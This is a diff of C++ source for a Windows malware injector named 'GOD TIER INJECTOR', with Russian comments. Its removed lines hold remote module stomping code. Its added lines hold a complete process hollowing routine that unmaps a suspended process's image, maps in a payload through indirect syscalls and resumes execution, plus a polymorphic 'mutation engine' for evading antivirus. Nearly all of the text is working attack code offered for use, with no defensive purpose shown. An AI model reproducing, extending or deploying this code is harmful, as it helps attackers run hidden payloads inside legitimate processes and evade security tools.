@@ -1,139 +1,205 @@
 // =============================================
-// GOD TIER INJECTOR v1.3 - FINAL
-// Process Hollowing + Module Stomping (локальный + удалённый)
-// + ExecuteStompedModule + Indirect Syscalls
+// GOD TIER INJECTOR v2.1 - WITH ERROR HANDLING
+// Smart mutation + proper error handling
 // =============================================
+
+#include <string>
+#include <optional>
 
 class GodTierInjector {
 public:
-    GodTierInjector();
-    ~GodTierInjector();
+    explicit GodTierInjector(UltimateBlackMutationEngine& engine);
 
-    bool Initialize();
+    // Настройка
+    void SetMutationParams(const UltimateBlackMutationEngine::EngineParams& params);
+    void EnableAutoMutation(bool enable);
+    void SetGlobalMutationIntensity(int intensity);
 
-    // === Методы инъекции ===
-    bool EarlyBirdInject(const std::wstring& targetPath, const std::vector<uint8_t>& payload);
-    bool ProcessHollowingInject(const std::wstring& targetPath, const std::vector<uint8_t>& newPE);
-    
-    // Module Stomping
-    bool ModuleStompingInject(const std::wstring& legitimateDllPath, const std::vector<uint8_t>& payload, PVOID* execAddr = nullptr);
-    bool RemoteModuleStompingInject(DWORD targetPid, const std::wstring& moduleName, const std::vector<uint8_t>& payload);
+    // === Публичные методы с обработкой ошибок ===
+    bool ProcessHollowingInject(const std::wstring& targetPath,
+                                const std::vector<uint8_t>& rawData,
+                                bool applyMutation = true);
 
-    // Удобный запуск после Module Stomping
+    bool EarlyBirdInject(const std::wstring& targetPath,
+                         const std::vector<uint8_t>& rawData,
+                         bool applyMutation = true);
+
+    bool ModuleStompingInject(const std::wstring& legitimateDllPath,
+                              const std::vector<uint8_t>& rawData,
+                              bool applyMutation = true,
+                              PVOID* executionAddress = nullptr);
+
+    bool RemoteModuleStompingInject(DWORD targetPid,
+                                    const std::wstring& moduleName,
+                                    const std::vector<uint8_t>& rawData,
+                                    bool applyMutation = true);
+
     bool ExecuteStompedModule(PVOID address, bool wait = false);
 
-private:
-    bool ResolveSyscalls();
-    bool BypassAntiAnalysis();
-    bool FindTextSectionInRemoteProcess(HANDLE hProcess, HMODULE hModule, PVOID& textAddr, SIZE_T& textSize);
+    // Работа с ошибками
+    std::string GetLastErrorMessage() const;
+    void ClearLastError();
 
-    // ... остальные приватные методы Hollowing ...
+private:
+    UltimateBlackMutationEngine& mutationEngine;
+    UltimateBlackMutationEngine::EngineParams baseParams;
+    bool autoMutationEnabled = true;
+    std::string lastErrorMessage;
+
+    void SetLastError(const std::string& message);
+    bool CheckSyscallResult(NTSTATUS status, const std::string& operation);
+
+    UltimateBlackMutationEngine::EngineParams GetSmartMutationParams(InjectionType type);
+    std::vector<uint8_t> PreparePayload(const std::vector<uint8_t>& rawData,
+                                        InjectionType type,
+                                        bool applyMutation);
 };
 
-// ==================== ВЫПОЛНЕНИЕ ПОСЛЕ MODULE STOMPING ====================
-bool GodTierInjector::ExecuteStompedModule(PVOID address, bool wait) {
-    if (!address) return false;
+// ==================== РЕАЛИЗАЦИЯ ====================
 
-    HANDLE hThread = CreateThread(
-        nullptr,
-        0,
-        (LPTHREAD_START_ROUTINE)address,
-        nullptr,
-        0,
-        nullptr
-    );
+GodTierInjector::GodTierInjector(UltimateBlackMutationEngine& engine)
+    : mutationEngine(engine) 
+{
+    // Устанавливаем разумные дефолтные параметры
+    baseParams.mutationIntensity = 6;
+    baseParams.garbageDensity = 15;
+    baseParams.enableFullMBA = true;
+}
 
-    if (!hThread) return false;
+void GodTierInjector::SetLastError(const std::string& message) {
+    lastErrorMessage = message;
+}
 
-    if (wait) {
-        WaitForSingleObject(hThread, INFINITE);
+std::string GodTierInjector::GetLastErrorMessage() const {
+    return lastErrorMessage;
+}
+
+void GodTierInjector::ClearLastError() {
+    lastErrorMessage.clear();
+}
+
+bool GodTierInjector::CheckSyscallResult(NTSTATUS status, const std::string& operation) {
+    if (status != 0) {
+        SetLastError("Syscall failed in " + operation + " (NTSTATUS: 0x" + 
+                     std::to_string(status) + ")");
+        return false;
     }
-
-    CloseHandle(hThread);
     return true;
 }
 
-// ==================== УДАЛЁННЫЙ MODULE STOMPING ====================
-bool GodTierInjector::RemoteModuleStompingInject(DWORD targetPid, 
-                                                 const std::wstring& moduleName,
-                                                 const std::vector<uint8_t>& payload) {
-    if (!Initialize()) return false;
+// ==================== ПРИМЕР РЕАЛИЗАЦИИ МЕТОДА С ОБРАБОТКОЙ ОШИБОК ====================
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
-    if (!hProcess) return false;
+bool GodTierInjector::ProcessHollowingInject(const std::wstring& targetPath,
+                                             const std::vector<uint8_t>& rawData,
+                                             bool applyMutation) 
+{
+    ClearLastError();
 
-    // Находим модуль в удалённом процессе (упрощённо — через EnumProcessModules)
-    HMODULE hModules[1024];
-    DWORD cbNeeded;
-    if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
-        CloseHandle(hProcess);
+    if (rawData.empty()) {
+        SetLastError("Empty payload provided");
         return false;
     }
 
-    HMODULE hTargetModule = nullptr;
-    for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
-        WCHAR modName[MAX_PATH];
-        if (GetModuleFileNameExW(hProcess, hModules[i], modName, MAX_PATH)) {
-            if (wcsstr(modName, moduleName.c_str())) {
-                hTargetModule = hModules[i];
-                break;
-            }
-        }
-    }
+    auto mutatedData = PreparePayload(rawData, InjectionType::ProcessHollowing, applyMutation);
 
-    if (!hTargetModule) {
-        CloseHandle(hProcess);
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    if (!CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        SetLastError("Failed to create suspended process");
         return false;
     }
 
-    PVOID textAddr = nullptr;
-    SIZE_T textSize = 0;
-
-    if (!FindTextSectionInRemoteProcess(hProcess, hTargetModule, textAddr, textSize)) {
-        CloseHandle(hProcess);
+    // Получаем контекст
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(pi.hThread, &ctx)) {
+        SetLastError("Failed to get thread context");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return false;
     }
 
-    if (payload.size() > textSize) {
-        CloseHandle(hProcess);
+    PVOID oldBase = nullptr;
+    PVOID remotePeb = (PVOID)ctx.Rdx;
+
+    // Читаем старый ImageBase
+    if (!ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remotePeb + 0x10), 
+                           &oldBase, sizeof(PVOID), nullptr)) {
+        SetLastError("Failed to read remote PEB");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
         return false;
     }
 
-    // Меняем защиту
-    ULONG oldProtect = 0;
-    PVOID base = textAddr;
-    SIZE_T size = textSize;
+    // Unmap оригинальный образ
+    NTSTATUS status = g_NtUnmapViewOfSection(pi.hProcess, oldBase);
+    if (!CheckSyscallResult(status, "NtUnmapViewOfSection")) {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
 
-    g_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
+    // Allocate память
+    PVOID newBase = nullptr;
+    SIZE_T regionSize = mutatedData.size() + 0x2000;
+    status = g_NtAllocateVirtualMemory(pi.hProcess, &newBase, 0, &regionSize,
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!CheckSyscallResult(status, "NtAllocateVirtualMemory")) {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
 
-    // Пишем пейлоад
-    g_NtWriteVirtualMemory(hProcess, textAddr, (PVOID)payload.data(), payload.size(), nullptr);
+    PVOID entryPoint = nullptr;
 
-    // Возвращаем защиту
-    base = textAddr;
-    size = textSize;
-    g_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
+    // Маппим PE
+    if (!MapPEIntoProcess(pi.hProcess, newBase, mutatedData, entryPoint)) {
+        SetLastError("Failed to map PE into target process");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
 
-    CloseHandle(hProcess);
+    // Фиксим релокейшены
+    auto dos = (PIMAGE_DOS_HEADER)mutatedData.data();
+    auto nt  = (PIMAGE_NT_HEADERS)(mutatedData.data() + dos->e_lfanew);
+    PVOID preferredBase = (PVOID)nt->OptionalHeader.ImageBase;
+
+    if (!FixRelocations(pi.hProcess, newBase, preferredBase)) {
+        SetLastError("Failed to fix relocations");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
+
+    // Обновляем PEB и контекст
+    if (!UpdatePEBAndContext(pi.hProcess, pi.hThread, newBase, entryPoint)) {
+        SetLastError("Failed to update PEB and context");
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
+
+    // Resume
+    status = g_NtResumeThread(pi.hThread, nullptr);
+    if (!CheckSyscallResult(status, "NtResumeThread")) {
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        return false;
+    }
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
     return true;
-}
-
-bool GodTierInjector::FindTextSectionInRemoteProcess(HANDLE hProcess, HMODULE hModule, 
-                                                     PVOID& textAddr, SIZE_T& textSize) {
-    BYTE headers[0x1000];
-    SIZE_T read = 0;
-    if (!ReadProcessMemory(hProcess, hModule, headers, sizeof(headers), &read)) return false;
-
-    auto dos = (PIMAGE_DOS_HEADER)headers;
-    auto nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
-
-    auto section = IMAGE_FIRST_SECTION(nt);
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        if (memcmp(section[i].Name, ".text", 5) == 0) {
-            textAddr = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
-            textSize = section[i].Misc.VirtualSize;
-            return true;
-        }
-    }
-    return false;
 }
